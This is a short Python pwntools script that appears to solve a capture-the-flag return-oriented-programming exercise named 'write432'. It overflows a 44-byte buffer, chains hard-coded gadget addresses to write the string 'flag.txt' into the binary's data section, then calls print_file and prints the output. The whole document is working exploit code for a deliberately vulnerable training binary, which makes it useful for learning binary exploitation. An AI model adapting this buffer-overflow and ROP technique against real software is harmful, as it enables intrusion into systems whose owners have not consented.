#usr/bin/python3
from pwn import *
elf = ELF("./write432")

padding = b"A"*44
pop_edi_pop_ebp = p32(0x080485aa)
section_data = p32(0x0804a018)
section_data_4 = p32(0x0804a018+4)
string1 = b"flag"
string2 = b".txt"
mov_dword_edi_ebp = p32(0x08048543)
pop_ebp = p32(0x080485ab)
call_print_file = p32(0x80483d0)

payload = padding + pop_edi_pop_ebp + section_data + string1 + mov_dword_edi_ebp
payload += pop_edi_pop_ebp + section_data_4 + string2 + mov_dword_edi_ebp
payload += call_print_file + pop_ebp + section_data

print(payload)
io = process(elf.path)
io.sendlineafter(">", payload)
print(io.recvall())

"""
io = process(elf.path)
io.sendline(payload)
io.interactive()
"""